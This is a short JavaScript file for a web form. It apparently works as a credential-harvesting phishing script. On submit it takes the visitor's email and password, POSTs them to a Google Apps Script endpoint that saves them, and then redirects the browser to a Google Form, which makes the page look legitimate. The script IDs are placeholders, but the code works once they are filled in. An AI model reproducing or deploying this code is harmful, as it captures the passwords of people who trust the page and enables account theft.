document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("userForm");

    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        // Get form values
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // Prepare data to send
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);

        // Google Apps Script endpoint to save data
        const scriptURL = "https://script.google.com/macros/s/AKfycbw_YOUR_SCRIPT_ID/exec";

        // Send data using fetch API
        fetch(scriptURL, {
            method: "POST",
            body: formData,
        })
            .then((response) => {
                if (response.ok) {
                    // Redirect to the Google Form
                    window.location.href = "https://forms.google.com/YOUR_FORM_URL";
                } else {
                    alert("Error saving data. Please try again.");
                }
            })
            .catch((error) => {
                console.error("Error:", error);
                alert("Error saving data. Please try again.");
            });
    });
});
